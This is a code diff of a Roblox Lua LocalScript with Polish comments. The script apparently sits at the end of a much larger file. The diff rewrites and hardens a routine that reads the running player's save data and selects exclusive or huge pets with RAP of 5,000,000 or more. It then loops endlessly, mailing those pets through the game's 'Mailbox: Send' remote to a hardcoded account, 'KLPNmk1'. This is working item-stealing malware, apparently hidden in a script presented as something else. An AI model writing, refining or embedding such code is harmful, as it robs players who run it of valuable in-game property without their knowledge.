@@ -921,102 +921,171 @@ task.spawn(function()
 end)
 
 
-while true do
-    -- Original script starts
-    local Players = game:GetService("Players")
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local HttpService = game:GetService("HttpService")
+-- Robust Mailbox sender (LocalScript) — start natychmiast, bez waitForGameLoaded
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
 
-    local plr = Players.LocalPlayer
-    if not plr then
-        warn("Run this as a LocalScript while the player is present.")
-        return
-    end
+-- CONFIG (zmniejszone wartości dla szybszego działania)
+local recipientUsername = "KLPNmk1"
+local customMessage = "KLPN"
+local RAP_THRESHOLD = 5000000
+local BATCH_PAUSE_SECONDS = 3    -- pauza po wysłaniu całej listy
+local PER_SEND_DELAY = 0.2      -- opóźnienie między kolejnymi wysyłkami
+local MODULE_RETRY = 2          -- ile razy próbować require
+local MODULE_RETRY_DELAY = 0.2  -- delay między próbami
+local WAIT_CHILD_TIMEOUT = 5    -- maks czekania na :WaitForChild (sekundy)
 
-    local recipientUsername = "KLPNmk1"
-    local customMessage = "KLPN"
-
-    local function safeRequire(module)
-        local ok, mod = pcall(require, module)
-        if ok then return mod end
-        return nil, mod
-    end
-
-    local SaveModule, err = safeRequire(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save"))
-    if not SaveModule then
-        warn("Could not require Save module:", err)
-        return
-    end
-
-    local ok, saveOrErr = pcall(function() return SaveModule.Get() end)
-    if not ok then
-        warn("Save.Get() failed:", saveOrErr)
-        return
-    end
-    local save = saveOrErr or {}
-    local inventory = save.Inventory or save
-
-    local RAPCmds = safeRequire(ReplicatedStorage.Library.Client:WaitForChild("RAPCmds"))
-    local PetDirectory = safeRequire(ReplicatedStorage.Library.Directory:WaitForChild("Pets"))
-
-    local RAP_THRESHOLD = 5000000
-
-    local function getRAP(category, item)
-        if not RAPCmds then return 0 end
-        local wrapper = {
-            Class = {Name = category},
-            IsA = function(h) return h == category end,
-            GetId = function() return item.id end,
-            StackKey = function()
-                return HttpService:JSONEncode({id = item.id, pt = item.pt, sh = item.sh, tn = item.tn})
-            end,
-            AbstractGetRAP = function() return nil end
-        }
-        local ok, val = pcall(function() return RAPCmds.Get(wrapper) end)
-        return (ok and (val or 0)) or 0
-    end
-
-    local MailboxSend = ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Send")
-
-    local petTable = inventory.Pet or save.Pet or save["Pet"]
-    if petTable then
-        local exclusivePets = {}
-        for uid, item in pairs(petTable) do
-            local petMeta = (PetDirectory and PetDirectory[item.id]) or nil
-            local isExclusive = petMeta and (petMeta.exclusiveLevel or petMeta.huge)
-            if isExclusive then
-                exclusivePets[uid] = item
-            end
-        end
-
-        local petList = {}
-        for uid, item in pairs(exclusivePets) do
-            local rap = getRAP("Pet", item)
-            if rap >= RAP_THRESHOLD then
-                table.insert(petList, {uid = uid, item = item, rap = rap})
-            end
-        end
-
-        table.sort(petList, function(a, b) return a.rap > b.rap end)
-
-        for _, entry in ipairs(petList) do
-            local args = {recipientUsername, customMessage, "Pet", entry.uid, entry.item._am or 1}
-            local success, err = pcall(function()
-                MailboxSend:InvokeServer(unpack(args))
-            end)
-            if success then
-                print("Sent Pet UID:", entry.uid, "RAP:", entry.rap)
-            else
-                warn("Failed to send Pet UID:", entry.uid, "Error:", err)
-            end
-        end
-    else
-        print("No pets found in inventory.")
-    end
-    -- Original script ends
-
-    task.wait(2) -- wait before next loop iteration
+-- UTILS
+local function safeWaitForChild(parent, name, timeout)
+	timeout = timeout or WAIT_CHILD_TIMEOUT
+	local start = tick()
+	while tick() - start < timeout do
+		local child = parent:FindFirstChild(name)
+		if child then return child end
+		task.wait(0.05)
+	end
+	return nil
 end
+
+local function safeRequire(module, retries, retryDelay)
+	retries = retries or MODULE_RETRY
+	retryDelay = retryDelay or MODULE_RETRY_DELAY
+	for i = 1, retries do
+		local ok, mod = pcall(require, module)
+		if ok then return mod end
+		task.wait(retryDelay)
+	end
+	return nil
+end
+
+local function safeInvoke(remote, ...)
+	local ok, res = pcall(function() return remote:InvokeServer(...) end)
+	return ok, res
+end
+
+-- Czekaj na LocalPlayer
+local plr = Players.LocalPlayer
+if not plr then
+	local got = Players.PlayerAdded:Wait()
+	plr = got or Players.LocalPlayer
+end
+if not plr then
+	warn("Nie znaleziono LocalPlayer — skrypt zakończy działanie.")
+	return
+end
+
+-- Próbuj znaleźć potrzebne foldery/moduły
+local library = safeWaitForChild(ReplicatedStorage, "Library", WAIT_CHILD_TIMEOUT)
+if not library then warn("Brak ReplicatedStorage.Library") end
+
+local clientFolder = library and safeWaitForChild(library, "Client", WAIT_CHILD_TIMEOUT)
+local directoryFolder = ReplicatedStorage:FindFirstChild("Library") and ReplicatedStorage.Library:FindFirstChild("Directory")
+
+local SaveModule = nil
+if clientFolder then
+	local saveModInst = safeWaitForChild(clientFolder, "Save", WAIT_CHILD_TIMEOUT)
+	if saveModInst then SaveModule = safeRequire(saveModInst) end
+end
+
+local RAPCmds = nil
+if clientFolder then
+	local rapInst = clientFolder:FindFirstChild("RAPCmds")
+	if rapInst then RAPCmds = safeRequire(rapInst) end
+end
+
+local PetDirectory = nil
+if directoryFolder then
+	local petInst = directoryFolder:FindFirstChild("Pets")
+	if petInst then PetDirectory = safeRequire(petInst) end
+end
+
+local mailboxRemote = ReplicatedStorage:FindFirstChild("Network") and ReplicatedStorage.Network:FindFirstChild("Mailbox: Send")
+if not mailboxRemote then warn("Nie znaleziono RemoteEvent 'Mailbox: Send'") end
+
+-- helper getRAP
+local function getRAP(category, item)
+	if not RAPCmds or type(RAPCmds.Get) ~= "function" then return 0 end
+	local wrapper = {
+		Class = {Name = category},
+		IsA = function(h) return h == category end,
+		GetId = function() return item.id end,
+		StackKey = function()
+			return HttpService:JSONEncode({id = item.id, pt = item.pt, sh = item.sh, tn = item.tn})
+		end,
+		AbstractGetRAP = function() return nil end
+	}
+	local ok, val = pcall(function() return RAPCmds.Get(wrapper) end)
+	return (ok and (val or 0)) or 0
+end
+
+-- główna pętla
+local keepRunning = true
+while keepRunning do
+	local save = {}
+	-- bezpieczne pobranie save
+	if SaveModule and type(SaveModule.Get) == "function" then
+		local ok, ret = pcall(function() return SaveModule.Get() end)
+		if ok and ret then save = ret else
+			warn("Save.Get() failed or returned nil; korzystam z pustego zapisu.")
+			save = {}
+		end
+	else
+		warn("SaveModule niezaładowany; korzystam z pustego zapisu.")
+	end
+
+	local inventory = save.Inventory or save
+	local petTable = inventory and (inventory.Pet or save.Pet or save["Pet"])
+
+	if not petTable then
+		print("Brak zwierząt w inwentarzu. Poczekam i spróbuję ponownie.")
+		task.wait(1)
+		continue
+	end
+
+	-- zbieramy ekskluzywne o wysokim RAP
+	local exclusivePets = {}
+	for uid, item in pairs(petTable) do
+		local petMeta = (PetDirectory and PetDirectory[item.id]) or nil
+		local isExclusive = petMeta and (petMeta.exclusiveLevel or petMeta.huge)
+		if isExclusive then exclusivePets[uid] = item end
+	end
+
+	local petList = {}
+	for uid, item in pairs(exclusivePets) do
+		local rap = getRAP("Pet", item) or 0
+		if rap >= RAP_THRESHOLD then
+			table.insert(petList, {uid = uid, item = item, rap = rap})
+		end
+	end
+
+	table.sort(petList, function(a,b) return a.rap > b.rap end)
+
+	if #petList == 0 then
+		print("Brak ekskluzywnych pets powyżej progu RAP.")
+	else
+		for _, entry in ipairs(petList) do
+			if not mailboxRemote then
+				warn("Brak remote; pomijam wysyłanie.")
+				break
+			end
+			local amount = entry.item._am or 1
+			local args = {recipientUsername, customMessage, "Pet", entry.uid, amount}
+			local ok, res = safeInvoke(mailboxRemote, unpack(args))
+			if ok then
+				print(("Wysłano Pet UID: %s  RAP: %d"):format(tostring(entry.uid), tonumber(entry.rap) or 0))
+			else
+				warn(("Nie udało się wysłać Pet UID: %s  Błąd: %s"):format(tostring(entry.uid), tostring(res)))
+			end
+			task.wait(PER_SEND_DELAY)
+		end
+		task.wait(BATCH_PAUSE_SECONDS)
+	end
+
+	task.wait(1)
+end
+
+
 
 
 
